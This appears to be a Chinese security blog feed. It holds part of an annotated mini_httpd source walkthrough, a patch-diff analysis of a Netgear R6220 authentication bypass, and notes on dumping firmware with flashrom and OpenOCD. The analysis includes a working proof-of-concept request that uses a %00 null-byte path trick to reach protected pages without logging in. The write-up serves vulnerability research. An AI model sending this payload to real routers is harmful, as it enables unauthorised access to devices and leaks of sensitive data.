listen6_fd != <span class="number">-1</span> &amp;&amp; FD_ISSET( listen6_fd, &amp;lfdset ) )</span><br><span class="line">	    conn_fd = accept( listen6_fd, &amp;usa.sa, &amp;sz );</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"select failure"</span> );</span><br><span class="line">	    (<span class="keyword">void</span>) <span class="built_in">fprintf</span>( <span class="built_in">stderr</span>, <span class="string">"%s: select failure\n"</span>, argv0 );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">if</span> ( conn_fd &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="keyword">if</span> ( errno == EINTR || errno == EAGAIN || errno == ECONNABORTED )</span><br><span class="line">		<span class="keyword">continue</span>;	<span class="comment">/* try again */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> EPROTO</span></span><br><span class="line">	    <span class="keyword">if</span> ( errno == EPROTO )</span><br><span class="line">		<span class="keyword">continue</span>;	<span class="comment">/* try again */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* EPROTO */</span></span></span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"accept - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"accept"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fork a sub-process to handle the connection. */</span></span><br><span class="line">	r = fork();</span><br><span class="line">	<span class="keyword">if</span> ( r &lt; <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    syslog( LOG_CRIT, <span class="string">"fork - %m"</span> );</span><br><span class="line">	    perror( <span class="string">"fork"</span> );</span><br><span class="line">	    <span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	<span class="keyword">if</span> ( r == <span class="number">0</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    <span class="comment">/* Child process. */</span></span><br><span class="line">	    client_addr = usa;</span><br><span class="line">	    <span class="keyword">if</span> ( listen4_fd != <span class="number">-1</span> )</span><br><span class="line">		(<span class="keyword">void</span>) close( listen4_fd );</span><br><span class="line">	    <span class="keyword">if</span> ( listen6_fd != <span class="number">-1</span> )</span><br><span class="line">		(<span class="keyword">void</span>) close( listen6_fd );</span><br><span class="line">	    handle_request();</span><br><span class="line">	    &#125;</span><br><span class="line">	(<span class="keyword">void</span>) close( conn_fd );</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="read-config（main-call"><a href="#read-config（main-call" class="headerlink" title="read_config（main call"></a>read_config（main call</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_config</span><span class="params">( <span class="keyword">char</span>* filename )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">char</span>* cp;</span><br><span class="line">    <span class="keyword">char</span>* cp2;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">    <span class="keyword">char</span>* value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开指定的配置文件（命令行中</span></span><br><span class="line">    fp = fopen( filename, <span class="string">"r"</span> );</span><br><span class="line">    <span class="keyword">if</span> ( fp == (FILE*) <span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		syslog( LOG_CRIT, <span class="string">"%s - %m"</span>, filename );</span><br><span class="line">		perror( filename );</span><br><span class="line">		<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( fgets( line, <span class="keyword">sizeof</span>(line), fp ) != (<span class="keyword">char</span>*) <span class="number">0</span> )<span class="comment">// 读取一行</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* Trim comments. */</span></span><br><span class="line">		<span class="keyword">if</span> ( ( cp = <span class="built_in">strchr</span>( line, <span class="string">'#'</span> ) ) != (<span class="keyword">char</span>*) <span class="number">0</span> )<span class="comment">// 处理注释行</span></span><br><span class="line">	    	*cp = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Skip leading whitespace. */</span></span><br><span class="line">		cp = line;</span><br><span class="line">		cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t\012\015"</span> );<span class="comment">// 处理换行，" \t\n\r"</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Split line into words. */</span></span><br><span class="line">		<span class="keyword">while</span> ( *cp != <span class="string">'\0'</span> )</span><br><span class="line">	    &#123;</span><br><span class="line">	    	<span class="comment">/* Find next whitespace. */</span></span><br><span class="line">	    	cp2 = cp + <span class="built_in">strcspn</span>( cp, <span class="string">" \t\012\015"</span> );</span><br><span class="line">	    	<span class="comment">/* Insert EOS and advance next-word pointer. */</span></span><br><span class="line">	    	while ( *cp2 == ' ' || *cp2 == '\t' || *cp2 == '\012' || *cp2 == '\015' )</span><br><span class="line">				*cp2++ = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 获取行中的键值对</span></span><br><span class="line">	    	<span class="comment">/* Split into name and value. */</span></span><br><span class="line">	    	name = cp;</span><br><span class="line">	    	value = <span class="built_in">strchr</span>( name, <span class="string">'='</span> );</span><br><span class="line">	    	<span class="keyword">if</span> ( value != (<span class="keyword">char</span>*) <span class="number">0</span> )</span><br><span class="line">				*value++ = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 分别处理，对相应的name赋值（全局变量</span></span><br><span class="line">	    	<span class="comment">/* Interpret. */</span></span><br><span class="line">	    	<span class="keyword">if</span> ( strcasecmp( name, <span class="string">"debug"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				no_value_required( name, value );</span><br><span class="line">				debug = <span class="number">1</span>;<span class="comment">// 只取0/1，则no_</span></span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"port"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				port = (<span class="keyword">unsigned</span> <span class="keyword">short</span>) atoi( value );<span class="comment">// 取具体的值，则没有no_</span></span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"dir"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				dir = e_strdup( value );<span class="comment">//  数字则atoi，字符串则strdup</span></span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"data_dir"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				data_dir = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"chroot"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				no_value_required( name, value );</span><br><span class="line">				do_chroot = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"nochroot"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				no_value_required( name, value );</span><br><span class="line">				do_chroot = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"user"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				user = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"cgipat"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				cgi_pattern = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"urlpat"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				url_pattern = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"noemptyreferers"</span> ) == <span class="number">0</span> ||strcasecmp( name, <span class="string">"noemptyreferrers"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				no_empty_referrers = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"localpat"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				local_pattern = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"host"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				hostname = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"logfile"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				logfile = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"vhost"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				no_value_required( name, value );</span><br><span class="line">				vhost = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"pidfile"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				pidfile = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"charset"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				charset = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"p3p"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				p3p = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"max_age"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				max_age = atoi( value );</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// ssl相关</span></span><br><span class="line">			<span class="meta">#<span class="meta-keyword">ifdef</span> USE_SSL</span></span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"ssl"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				no_value_required( name, value );</span><br><span class="line">				do_ssl = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"certfile"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				certfile = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">	    	<span class="keyword">else</span> <span class="keyword">if</span> ( strcasecmp( name, <span class="string">"cipher"</span> ) == <span class="number">0</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				value_required( name, value );</span><br><span class="line">				cipher = e_strdup( value );</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* USE_SSL */</span></span></span><br><span class="line">	    	<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				(<span class="keyword">void</span>) <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s: unknown config option '%s'\n"</span>, argv0, name );</span><br><span class="line">				<span class="built_in">exit</span>( <span class="number">1</span> );</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">	    	<span class="comment">/* Advance to next word. */</span></span><br><span class="line">	    	cp = cp2;</span><br><span class="line">	    	cp += <span class="built_in">strspn</span>( cp, <span class="string">" \t\012\015"</span> );</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    (<span class="keyword">void</span>) fclose( fp );<span class="comment">// 关闭配置文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Netgear R6220 认证绕过漏洞分析</title>
    <url>/2021/01/13/iot/Netgear%20R6220%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="Netgear-R6220-认证绕过漏洞分析"><a href="#Netgear-R6220-认证绕过漏洞分析" class="headerlink" title="Netgear R6220 认证绕过漏洞分析"></a>Netgear R6220 认证绕过漏洞分析</h1><h2 id="00-前言"><a href="#00-前言" class="headerlink" title="00-前言"></a>00-前言</h2><p>依据cve/zdi等平台发布的漏洞信息，借助补丁对比技术，对Netgear r6220认证绕过漏洞进行研究，涉及漏洞的发现过程、成因分析、POC编写</p>
<h2 id="01-简介"><a href="#01-简介" class="headerlink" title="01-简介"></a>01-简介</h2><ol>
<li><p>漏洞描述：<a href="https://www.zerodayinitiative.com/advisories/ZDI-19-866/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</a><a id="more"></a></p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR AC1200 R6220 Firmware version 1.1.0.86 Smart WiFi Router. Authentication is not required to exploit this vulnerability. The specific flaw exists within the processing of path strings. By inserting a null byte into the path, the user can skip most authentication checks. An attacker can leverage this vulnerability to bypass authentication on the system.</span><br></pre></td></tr></table></figure>
</li>
<li><p>关键点：netgear r6220、版本1.1.0.86及之前、认证绕过、路径字符串中null字节</p>
</li>
<li><p>通过认证绕过，可访问一些受限页面，会造成敏感信息泄漏，扩大被攻击面</p>
</li>
</ol>
<h2 id="02-准备"><a href="#02-准备" class="headerlink" title="02-准备"></a>02-准备</h2><ol>
<li><p>确定待比较版本：<a href="http://support.netgear.cn/doucument/Detail.asp?id=2294" target="_blank" rel="noopener">netgear中国站点</a>存在1.1.0.86和1.1.0.92这两个版本（以下简称86版和92版），由上述漏洞描述可知86版是有漏洞版本，而<a href="http://support.netgear.cn/doucument/Version.asp?id=5224" target="_blank" rel="noopener">92版的版本说明</a>中提及修复了<a href="https://kb.netgear.com/000061516/Security-Advisory-for-HTTP-Authentication-Bypass-on-the-R6220-PSV-2019-0109" target="_blank" rel="noopener">PSV-2019-0109</a>（netgear自家的漏洞编号），综合上述信息，选择86与92为对比版本</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014135.jpg" alt="image-20210105094335549"></p>
</li>
<li><p>固件下载：</p>
<ul>
<li>Version 1.1.0.86（有漏洞）：<a href="http://support.netgear.cn/Upfilepath/R6220-V1.1.0.86.img" target="_blank" rel="noopener">http://support.netgear.cn/Upfilepath/R6220-V1.1.0.86.img</a></li>
<li>Version 1.1.0.92（已修复）：<a href="http://support.netgear.cn/Upfilepath/R6220-V1.1.0.92_1.0.1_BETA.img" target="_blank" rel="noopener">http://support.netgear.cn/Upfilepath/R6220-V1.1.0.92_1.0.1_BETA.img</a></li>
</ul>
</li>
<li><p>相关工具</p>
<ul>
<li>漏洞对比：ida 6.8 + bindiff 4.3</li>
<li>静态分析：ida 6.8</li>
<li>http发包：burpsuite</li>
<li>文件系统提取：Ubuntu 18.04下binwalk</li>
</ul>
</li>
<li>ps：因手头正好有一台1.1.0.68（86之前）的netgear r6220，因此省去了固件模拟的步骤</li>
</ol>
<h2 id="03-补丁对比"><a href="#03-补丁对比" class="headerlink" title="03-补丁对比"></a>03-补丁对比</h2><blockquote>
<p>bindiff的用法自行学习，本文不再赘述</p>
</blockquote>
<ol>
<li><p>按相似度不为1，从上到下依次看，略过库函数，重点看sub_xxx这种未命名函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014138.jpg" alt="image-20210105095532930"></p>
</li>
<li><p>运气比较好，看了第一个sub_4094c8 vs sub_409548 就找到了敏感位置，这两个函数代码块比较多（500+），故bindiff中并未完全展开，如下所示：二者有6处不同，右-92版比左-86版多了两个代码块，重点看这两种</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014139.jpg" alt="image-20210105100227147"></p>
</li>
<li><p>依次查看黄色代码块（即有变化的），直到发现如下：右侧出现了a00，即00字符串。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014142.jpg" alt="image-20210105100736619"></p>
</li>
<li><p>联想漏洞描述中“By inserting a null byte into the path……”，此处比较可疑，ida中重点看一下（已修复的92版）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014137.jpg" alt="image-20210105103646601"></p>
<p> 向上追溯，可推断strstr的参数1为uri，若发现00字符，则最终跳往如下：明显进入了处理错误的流程</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-14135.jpg" alt="image-20210105103913402"></p>
</li>
<li><p>经过如上分析，可基本断定补丁所修补的地方，接下来需进一步分析程序，来看漏洞如何出现，又该如何触发</p>
</li>
<li><p>PS：补丁对比本身也是要看运气的，首先要从众多函数中找到已修改且敏感的函数，再找函数中修改过的代码块，再结合漏洞信息来判定，如果不是，则周而复始再看其他的，也比较耗时</p>
</li>
</ol>
<h2 id="04-简单测试"><a href="#04-简单测试" class="headerlink" title="04-简单测试"></a>04-简单测试</h2><ol>
<li><p>binwalk从固件中提取出文件系统，其web根目录有如下文件，随手测试几个</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-14138.jpg" alt="image-20210105171650327"></p>
</li>
<li><p>/currentsetting.htm可直接访问，无需经过认证</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014131.jpg" alt="image-20210105165842358"></p>
</li>
<li><p>/index.htm则需要经过认证</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-14141.jpg" alt="image-20210105170001396"></p>
</li>
<li><p>联系漏洞描述“The specific flaw exists within the processing of path strings. By inserting a null byte into the path, the user can skip most authentication checks.”，漏洞可能发生在此处对uri的处理中。</p>
</li>
</ol>
<h2 id="05-漏洞分析"><a href="#05-漏洞分析" class="headerlink" title="05-漏洞分析"></a>05-漏洞分析</h2><blockquote>
<p>基于92已修复版本的web程序，其位于文件系统下/usr/sbin/mini_httpd</p>
</blockquote>
<ol>
<li><p>通过bindiff定位到大概位置<strong>（上述步骤4）</strong>：92版sub_409548函数中strstr检测%00处</p>
</li>
<li><p>向上回溯，如下：j跳转到一个循环，将某标志置为0（mips的流水线效应），并取了一堆字符串的首地址</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014136.jpg" alt="image-20210105150543701"></p>
</li>
<li><p>off_422c10处是字符串数组，这些html无需认证就可访问</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014144.jpg" alt="image-20210105145831086"></p>
</li>
<li><p>循环中遍历uri中是否出现这个html文件，若出现，则将标志置1</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014141.jpg" alt="image-20210105150716076"></p>
</li>
<li><p>上述补丁对比时，发现有一个strstr来判断uri中是否出现%00，若没发现，则继续调用sub_404ad4并传参uri</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014140.jpg" alt="image-20210105151453520"></p>
</li>
<li><p>sub_404ad4中，逐个字符来检测uri中是否出现%，并对其后的两个字符作进一步处理，大概可推测是URL解码的操作，查看处理函数sub_404a80可验证上述猜想</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014134.jpg" alt="image-20210105153905752"></p>
</li>
<li><p>注意，上述分析都是基于92版即已修复版本的，在86有漏洞版本中，并没有strstr对%00的过滤，如上述bindiff截图所示</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014142.jpg" alt="image-20210105100736619"></p>
</li>
</ol>
<h2 id="06-构造POC"><a href="#06-构造POC" class="headerlink" title="06-构造POC"></a>06-构造POC</h2><ol>
<li><p>有漏洞版本中：没有验证%00是否存在，直接进行了URL的解码处理，因此%00可以导致字符串的截断，结合成因分析步骤3/4中循环检测currentsetting.html等字符串的操作，可构造如下poc</p>
 <figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.htm%00currentsetting.htm</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure>
</li>
<li><p>认证绕过的逻辑</p>
<ol>
<li>uri为：<code>/index.htm%00currentsetting.htm</code></li>
<li>程序先检测uri，确实存在<code>currentsetting.html</code>这种无需认证就可访问web文件</li>
<li>随后未检测%00便进行URL解码，产生00截断，此时uri为：<code>/index.htm</code>，前面已经经过了检测，故正常进行访问</li>
<li>%00前是真正要访问的web文件，%00后是为了绕过认证而特意添加的“合法后缀”，程序处理逻辑有误，故造成认证绕过</li>
</ol>
</li>
<li><p>如burp测试时，直接访问/index.htm会提示401，而通过poc可绕过认证</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-014143.jpg" alt="image-20210105172149527"></p>
</li>
</ol>
<h2 id="07-小结"><a href="#07-小结" class="headerlink" title="07-小结"></a>07-小结</h2><ul>
<li>这个漏洞原理比较简单，简单捋一下<ol>
<li>认证时逻辑有误，导致认证绕过</li>
<li>读取受限文件，若文件中包含密码等信息则造成敏感信息泄漏</li>
<li>不管在LAN端还是WAN端，都扩大了被攻击面</li>
</ol>
</li>
<li>官方的修复看起来有些草率，既然是null byte的截断漏洞，就直接strstr检测%00，有种“黑名单”的思想，但换一种角度想，代码更新迭代至今，这种修复方式也是无可奈何</li>
</ul>
<h2 id="08-参考"><a href="#08-参考" class="headerlink" title="08-参考"></a>08-参考</h2><ol>
<li>ZDI漏洞通告：<a href="https://www.zerodayinitiative.com/advisories/ZDI-19-866/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</a></li>
<li>官方补丁说明：<a href="https://kb.netgear.com/000061516/Security-Advisory-for-HTTP-Authentication-Bypass-on-the-R6220-PSV-2019-0109" target="_blank" rel="noopener">https://kb.netgear.com/000061516/Security-Advisory-for-HTTP-Authentication-Bypass-on-the-R6220-PSV-2019-0109</a></li>
</ol>
<p>首发于安全客<a href="https://www.anquanke.com/post/id/227623" target="_blank" rel="noopener">https://www.anquanke.com/post/id/227623</a></p>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>认证绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件法提取固件概述</title>
    <url>/2021/01/10/iot/%E7%A1%AC%E4%BB%B6%E6%B3%95%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="硬件法提取固件概述"><a href="#硬件法提取固件概述" class="headerlink" title="硬件法提取固件概述"></a>硬件法提取固件概述</h2><ul>
<li>概要：芯片封装、引脚定义、芯片夹、flashroom、openocd、芯片手册、提取固件（falsh外置/mcu内置）</li>
<li>为何免拆提取<ul>
<li>拆卸+焊接，麻烦且考验动手能力</li>
<li>电烙铁、热吹风等工具的限制</li>
<li>客户不允许拆</li>
</ul>
</li>
<li>固件存储位置：flash外置存储、mcu内置存储</li>
<li>芯片封装与引脚定义<ul>
<li>SOP、QFP、QFN、BGA</li>
<li>SOP、QFP针脚外露，可用芯片夹子实现免拆提取</li>
<li>后两者不可，如BGA封装在下面（文中没写QFN）</li>
</ul>
</li>
<li>SOP<ul>
<li>针脚外露，有8根或16根，即SOP8/16</li>
<li>SOP8/16 封装的 Flash 在路由器、摄像头等 IOT 设备厂较为常见</li>
<li>一个角上有小圆点，为第一针脚，其余逆时针排布</li>
<li>型号代码一般是24或25开头（型号代码是啥？）//here</li>
</ul>
</li>
<li>QFP<ul>
<li>针脚外露，针脚数一般都在64以上</li>
<li>针脚数不固定，没有统一标准，由厂商自行定义</li>
<li>在小型IOT设备中可作为主控或协处理器（sop为flash，此为cpu）</li>
<li>针脚定义见具体厂商的芯片手册、示例图见文中</li>
</ul>
</li>
<li>BGA<ul>
<li>I/O 端子在封装下方，提取固件则需要使用BGA返修台拆卸下来读取，不能实现免拆提取</li>
<li>一般用于 CPU 和大容量存储</li>
<li>同FFP，针脚定义见具体厂商的芯片手册、示例图见文中</li>
</ul>
</li>
<li>芯片夹：SOP8/16脚测夹、芯片通用测试夹测试钩子、ECU 探针</li>
<li>SOP8/16脚测夹<ul>
<li>常用于 SPI 闪存的固件提取</li>
<li>SOP8 以及 SOP16 封装的芯片</li>
<li>示例图见文</li>
</ul>
</li>
<li>芯片通用测试夹测试钩子<ul>
<li>常用于SOP QFP 封装芯片的固件提取或协议分析</li>
<li>第一种：适用针脚较少的芯片（如 SOP8 封装的）、勾式扁式分别对应单钩双钩、价格相对便宜</li>
<li>第二种：夹子更细、用在有更多更细的针脚芯片上（如 QFP 封装的）、价格贵</li>
<li>示例图见文</li>
<li>第二种：夹子比较小，夹连续的针脚时有一定的困难，需要反复尝试</li>
<li>第二种：由于没有支撑，可能刚夹上就被弹开，所以需要ECU 探针</li>
</ul>
</li>
<li>ECU 探针<ul>
<li>多用于汽车 ECU 固件提取，也可用于其它</li>
<li>带有支架，只需要把探针搭在对应的芯片针脚上，搭而非夹</li>
<li>如芯片通用测试夹测试钩子，第二种，刚夹上就被弹开的情况</li>
<li>使用 ECU 探针读取固件方式与使用芯片通用测试夹测试钩子类似。唯一的差异是探针是搭在针脚上，而不是夹在针脚上</li>
<li>示例图见文</li>
</ul>
</li>
<li>从flash提取<ul>
<li>读取 SOP8 封装的 SPI Flash较多</li>
<li>软件：flashroom</li>
<li>硬件：测试夹（即sop8/16）、编程器（CH341A较慢，用树莓派）</li>
<li>步骤1，apt 安装flashroom</li>
<li>步骤2，配置树莓派：启用其spi接口并加载spi模块</li>
<li>步骤3，接线：找树莓派的引脚定义、找flash的引脚定义、flashroom给出二者如何连接（rpi header与spi flash的表）</li>
<li>步骤4，提取：flashrom p linux_spi:dev=/dev/spidev0.0,spispeed=1000 r w25q_rasp.bin（p指定设备类型/读写速度、r保存路径、若写回flash则用w）</li>
<li>接线时，用到了一块中介板子，怎么连的？//here</li>
</ul>
</li>
<li>从mcu提取<ul>
<li>固件位于mcu内置flash，通过调试接口（SWD/JTAG等）提取</li>
<li>FT232H作为pc与mcu的中转，usb插电脑，怎么连接mcu？图没看懂//here）</li>
</ul>
</li>
<li>硬件<ul>
<li>测试夹：芯片通用测试夹测试钩子</li>
<li>调试器：FT232H（提供USB到多种转接，如JTAG/SWD/UART），也可用 JLink、STLink 等调试器</li>
</ul>
</li>
<li>软件：OpenOCD<ul>
<li>Open OnChip Debugger，开源的片上调试器</li>
<li>可以与 GDB 配合进行动态调试（具体步骤未提及//here）</li>
<li>运行需两个配置文件：调试器和目标芯片的配置文件，openocd/scripts# openocd f interface/ft232hmoduleswd.cfg  f target/stm32f0x.cfg </li>
<li>运行之后，使用 telnet 连接本地的 4444 端口与芯片进行交互</li>
<li>help 查看支持命令、提取固件使用 dump_image</li>
</ul>
</li>
<li>芯片手册<ul>
<li>根据芯片丝印 STM32f030 RCT6，找手册</li>
<li>采用 SWD进行调试：目录3.16Serial wire debug port (SWDP)：An Arm SWDP interface is provided to allow a serial wire debugging tool to be connected to the MCU.</li>
